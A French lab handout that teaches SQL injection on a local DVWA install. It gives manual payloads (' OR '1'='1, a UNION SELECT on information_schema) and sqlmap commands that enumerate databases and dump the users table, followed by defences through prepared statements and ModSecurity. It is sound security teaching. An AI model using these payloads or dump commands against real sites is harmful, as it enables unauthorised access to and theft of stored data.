# TP 03 : Attaque par Injection SQL (SQLi)

## Objectif

L'objectif de ce **TP** est de vous familiariser avec les **attaques par injection SQL (SQLi)**, une méthode qui permet à un attaquant d'interagir avec une base de données via des entrées utilisateur mal sécurisées. Vous allez :

- Comprendre le mécanisme d'une attaque **SQLi**.
- Simuler une attaque **SQLi** dans un environnement contrôlé pour extraire des informations sensibles d'une base de données.
- Découvrir des techniques de prévention pour protéger les applications web contre ce type d'attaque.

---

## Partie 1 : Théorie et Concepts

### 1.1 Qu'est-ce qu'une attaque par Injection SQL (SQLi) ?

Une attaque par **Injection SQL (SQLi)** survient lorsqu'un attaquant injecte des requêtes SQL malveillantes dans une entrée utilisateur non sécurisée (comme un champ de formulaire) pour interagir directement avec la base de données. L'objectif est de manipuler les requêtes SQL afin d'accéder à des informations sensibles ou de compromettre la base de données.

#### Types d'attaques SQLi

- **Injection SQL classique** : L'attaquant insère une requête SQL dans un champ d'entrée utilisateur pour obtenir des informations non autorisées.
- **SQLi basée sur le temps (Time-based SQLi)** : L'attaquant force la base de données à effectuer des opérations longues pour vérifier la vulnérabilité.
- **Blind SQL Injection** : Lorsque les résultats des requêtes SQL injectées ne sont pas directement visibles, l'attaquant effectue des tests pour déduire les réponses via des actions indirectes.

---

## Partie 2 : Préparation de l'environnement

### 2.1 Logiciels nécessaires

1. **LAMP Stack** : Installez un serveur web avec une base de données **MySQL** et **PHP** pour créer un environnement d'application web vulnérable.
2. **DVWA (Damn Vulnerable Web Application)** : C'est une application web vulnérable par design, idéale pour pratiquer des attaques **SQLi** en toute sécurité.
3. **sqlmap** : Un outil d'automatisation pour tester et exploiter les vulnérabilités **SQLi**.

### 2.2 Installation de DVWA

1. **Installer Apache, MySQL et PHP** :
   
   Installez la pile **LAMP** pour configurer un serveur web local.
   
   ```bash
   sudo apt install apache2 mysql-server php libapache2-mod-php php-mysql
   ```

2. **Télécharger et configurer DVWA** :
   
   - Téléchargez **DVWA** depuis **GitHub** :
   
     ```bash
     git clone https://github.com/digininja/DVWA.git /var/www/html/dvwa
     ```
   - Configurez la base de données dans le fichier `config/config.inc.php` de **DVWA**, puis initialisez la base de données en vous rendant sur l'application web via `http://localhost/dvwa/`.

---

## Partie 3 : Simulation d'une Attaque par Injection SQL

### 3.1 Identification de la vulnérabilité

1. **Connexion à DVWA** :
   
   - Accédez à l'interface web de **DVWA** via un navigateur : `http://localhost/dvwa/`.
   - Connectez-vous en utilisant les informations d'identification par défaut (`admin` / `password`).

2. **Détection de la vulnérabilité SQLi** :
   
   - Allez dans l'onglet **SQL Injection** de l'application **DVWA**.
   - Entrez une entrée malveillante dans le champ de recherche des utilisateurs. Par exemple :
   
     ```bash
     ' OR '1'='1
     ```
   Cette entrée modifie la requête **SQL** pour retourner tous les utilisateurs de la base de données.

### 3.2 Exploitation manuelle de SQLi

1. **Extraire les informations de la base de données** :
   
   - Dans le champ de recherche, injectez la commande suivante pour lister les utilisateurs de la base de données :
   
     ```bash
     ' OR '1'='1' --
     ```
   - Cette commande court-circuite la requête **SQL** pour afficher tous les enregistrements de la table.

2. **Test avec des requêtes plus complexes** :
   
   - Essayez d'extraire le nom des tables dans la base de données :
   
     ```bash
     ' UNION SELECT null, table_name FROM information_schema.tables --
     ```

### 3.3 Utilisation de sqlmap pour automatiser l'attaque

1. **Installation de sqlmap** :
   
   Installez **sqlmap**, un outil qui automatise les attaques par injection **SQL**.
   
   ```bash
   sudo apt install sqlmap
   ```

2. **Exploitation automatique avec sqlmap** :
   
   - Identifiez l'URL vulnérable dans **DVWA** (par exemple, après avoir soumis une requête dans le champ de recherche).
   - Utilisez **sqlmap** pour détecter et exploiter la vulnérabilité :
   
     ```bash
     sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<votre_session_id>" --dbs
     ```
   Cette commande permet d'énumérer toutes les bases de données.

3. **Extraction des données sensibles** :
   
   Utilisez **sqlmap** pour extraire les informations sensibles d'une table spécifique :
   
   ```bash
   sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<votre_session_id>" -D dvwa --tables
   sqlmap -u "http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<votre_session_id>" -D dvwa -T users --dump
   ```
   Cette commande permet d'extraire toutes les données de la table des utilisateurs.

---

## Partie 4 : Prévention des attaques SQLi

### 4.1 Utilisation de requêtes préparées

1. **Requêtes préparées avec PDO (PHP Data Objects)** :
   
   Pour éviter les injections **SQL**, utilisez des **requêtes préparées** qui séparent la logique **SQL** des données fournies par l'utilisateur.

   Exemple en **PHP** avec PDO :
   
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
   $stmt->bindParam(':id', $id);
   $stmt->execute();
   ```
   Les **requêtes préparées** empêchent l'exécution directe des entrées utilisateur comme commandes **SQL**.

2. **Échappement des entrées utilisateur** :
   
   Si vous ne pouvez pas utiliser de **requêtes préparées**, assurez-vous d'échapper toutes les entrées utilisateur pour éviter toute interprétation malveillante.

### 4.2 Utilisation d'un WAF (Web Application Firewall)

1. **Configurer ModSecurity pour Apache** :
   
   Installez **ModSecurity**, un **pare-feu applicatif (WAF)**, pour protéger votre serveur contre les attaques **SQLi**.
   
   ```bash
   sudo apt install libapache2-mod-security2
   sudo a2enmod security2
   ```
   **ModSecurity** détecte et bloque les modèles de requêtes malveillantes, notamment les tentatives d'injection **SQL**.

2. **Configurer les règles de sécurité** :
   
   Modifiez les règles par défaut dans le fichier de configuration de **ModSecurity** pour renforcer la protection contre les attaques **SQLi**. Activez les règles **OWASP Core Rule Set (CRS)**.

---

## Partie 5 : Analyse et Documentation

1. **Analyse des résultats** :
   
   Documentez les étapes d'injection **SQL** réussies, y compris les commandes injectées et les données sensibles récupérées. Utilisez des captures d'écran de l'interface **DVWA** et de **sqlmap**.

2. **Impact de la protection** :
   
   Testez les mesures de protection (**requêtes préparées**, **WAF**) et montrez comment ces techniques empêchent l'injection **SQL**.

---

## Dépôt du TP

Veuillez déposer votre ***TP*** (.pdf) sur [ce lien Google Classroom](https://classroom.google.com/c/NzIwNDg4OTMyNTk4?cjc=ya2vfva), n'oubliez pas de mentionner votre prénom & nom.

---

## Résumé

Dans ce **TP**, vous avez appris à simuler et analyser une attaque par **Injection SQL (SQLi)** dans un environnement sécurisé avec **DVWA**. Vous avez également découvert des techniques de prévention, telles que l'utilisation de **requêtes préparées** et de **pare-feux applicatifs (WAF)**.

### Compétences acquises :

- Simulation d'une attaque **SQLi** via **DVWA**.
- Exploitation manuelle et automatisée avec **sqlmap**.
- Mise en place de mesures de prévention contre les injections **SQL**, telles que les **requêtes préparées** et les **WAF**.

N'hésitez pas à poser des questions si vous avez besoin d'aide pour ce **TP** !